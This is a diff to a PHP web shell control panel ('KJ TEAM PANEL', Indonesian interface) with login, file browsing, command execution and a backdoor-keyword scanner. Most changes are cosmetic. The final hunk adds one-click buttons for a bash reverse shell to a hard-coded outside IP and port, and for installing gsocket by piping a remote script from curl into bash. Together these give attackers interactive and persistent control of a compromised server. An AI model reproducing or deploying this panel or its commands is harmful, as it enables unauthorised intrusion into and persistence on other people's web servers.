@@ -263,7 +263,7 @@ if (!isset($_SESSION['logged_in'])) {
     <html lang="id">
     <head>
         <meta charset="UTF-8">
-        <title>Login - Kj TEAM</title>
+        <title>Login - KJ TEAM</title>
         <style>
             @import url("https://fonts.googleapis.com/css2?family=Chakra+Petch:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&display=swap");
             body {
@@ -328,7 +328,7 @@ if (!isset($_SESSION['logged_in'])) {
     <body>
         <form method="POST" class="login-box">
             <img src="https://i.ibb.co/Df8g5PYb/kj.png" alt="Kj TEAM">
-            <h2>Kj TEAM PANEL</h2>
+            <h2>KJ TEAM PANEL</h2>
             <input type="text" name="username" placeholder="Username" required>
             <input type="password" name="password" placeholder="Password" required>
             <button type="submit" name="login">MASUK</button>
@@ -557,13 +557,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
     }
 
-    // ============ SCAN BACKDOOR - HANYA PHP, PHTML, SHTML ============
+    // Scan Backdoor - HANYA PHP, PHTML, SHTML
     if (isset($_POST['scan_backdoor'])) {
         $scanPath = $_POST['scan_path'] ?? $currentPath;
         if (!is_dir($scanPath)) {
             echo "<div class='alert error'>⚠️ Direktori tidak valid.</div>";
         } else {
-            // HANYA ekstensi PHP, PHTML, SHTML
             $allowedExtensions = ['php', 'phtml', 'shtml'];
             
             $danger_keywords = [
@@ -589,14 +588,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     if ($item === '.' || $item === '..') continue;
                     $path = $dir . DIRECTORY_SEPARATOR . $item;
 
-                    // Skip file log
                     if (basename($path) === 'shell-found.txt' || strpos(basename($path), 'scan_result_') === 0) continue;
 
                     if (is_dir($path)) {
                         scanBackdoorDeep($path, $results, $danger_keywords, $allowedExtensions, $scanLog);
                     } else {
                         $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
-                        // HANYA scan untuk PHP, PHTML, SHTML
                         if (in_array($ext, $allowedExtensions)) {
                             $content = @file_get_contents($path);
                             if (!$content) continue;
@@ -604,14 +601,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                             $content_lower = strtolower($content);
                             $detected = [];
                             $level = '';
-                            $matchKeywords = [];
 
                             foreach ($danger_keywords as $lvl => $keywords) {
                                 foreach ($keywords as $kw) {
                                     if (strpos($content_lower, strtolower($kw)) !== false) {
                                         $detected[] = $kw;
                                         $level = $lvl;
-                                        $matchKeywords[] = $kw;
                                     }
                                 }
                                 if (!empty($detected)) {
@@ -626,7 +621,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                                     'hits' => $detected
                                 ];
                                 
-                                // Tambahkan ke log
                                 $scanLog[] = "🔴 FILE: " . $path;
                                 $scanLog[] = "    ⚠️ Level: " . strtoupper($level);
                                 $scanLog[] = "    🎯 Ditemukan: " . implode(', ', $detected);
@@ -641,7 +635,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
             scanBackdoorDeep($scanPath, $suspectFiles, $danger_keywords, $allowedExtensions, $scanLog);
 
-            // Tambahkan ringkasan
             $scanLog[] = "\n==================================================";
             $scanLog[] = "📊 RINGKASAN SCAN";
             $scanLog[] = "==================================================";
@@ -649,13 +642,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $scanLog[] = "📅 Selesai pada: " . date('Y-m-d H:i:s');
             $scanLog[] = "==================================================";
 
-            // Simpan ke file TXT
             $timestamp = date('Ymd_His');
             $txtFileName = 'scan_result_' . $timestamp . '.txt';
             $txtFilePath = __DIR__ . '/' . $txtFileName;
             file_put_contents($txtFilePath, implode("\n", $scanLog));
 
-            // Tampilkan hasil di browser
             if (!empty($suspectFiles)) {
                 echo "<div style='margin:20px 0;'>";
                 echo "<div class='alert success'>✅ Scan selesai! Ditemukan " . count($suspectFiles) . " file mencurigakan.</div>";
@@ -693,7 +684,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 echo "</div>";
             }
         }
-        exit; // Stop eksekusi setelah scan
+        exit;
     }
 }
 
@@ -772,7 +763,6 @@ $breadcrumb = buildBreadcrumb($currentPath);
         .badge-warn { background: #3a3a1a; color: #efef4a; border-color: #7a7a4a; }
         .badge-danger { background: #3a1a1a; color: #ef4a4a; border-color: #7a4a4a; }
         
-        /* ============ BREADCRUMB NAVIGATOR ============ */
         .breadcrumb-nav {
             background: #0a0e27;
             border: 1px solid #2d4a7a;
@@ -1012,7 +1002,7 @@ $breadcrumb = buildBreadcrumb($currentPath);
         <div class="alert <?php echo $messageType; ?>"><?php echo $message; ?></div>
     <?php endif; ?>
 
-    <!-- ============ BREADCRUMB NAVIGATOR ============ -->
+    <!-- BREADCRUMB NAVIGATOR -->
     <div class="breadcrumb-nav">
         <span class="home-icon">🏠</span>
         <?php foreach ($breadcrumb as $index => $item): ?>
@@ -1053,6 +1043,21 @@ $breadcrumb = buildBreadcrumb($currentPath);
             <form method="POST"><input type="hidden" name="command" value="whoami"><button type="submit" name="run_command" class="btn btn-sm">whoami</button></form>
             <form method="POST"><input type="hidden" name="command" value="id"><button type="submit" name="run_command" class="btn btn-sm">id</button></form>
             <form method="POST"><input type="hidden" name="command" value="uname -a"><button type="submit" name="run_command" class="btn btn-sm">uname -a</button></form>
+            <!-- BACK CONNECT -->
+            <form method="POST">
+                <input type="hidden" name="command" value="bash -c 'exec bash -i &>/dev/tcp/209.97.168.150/5678 <&1'">
+                <button type="submit" name="run_command" class="btn btn-sm" style="border-color:#ff6b6b;">🔌 Back Connect</button>
+            </form>
+            <!-- GSOCKET INSTALL -->
+            <form method="POST">
+                <input type="hidden" name="command" value='<?php echo 'X=' . generate_random_string() . ' bash -c "$(curl -fsSL https://gsocket.io/y)"'; ?>'>
+                <button type="submit" name="run_command" class="btn btn-sm">📡 Install Gsocket</button>
+            </form>
+            <!-- GSOCKET UNINSTALL -->
+            <form method="POST">
+                <input type="hidden" name="command" value='GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)";'>
+                <button type="submit" name="run_command" class="btn btn-sm btn-danger">🗑️ Uninstall Gsocket</button>
+            </form>
         </div>
     </div>
 
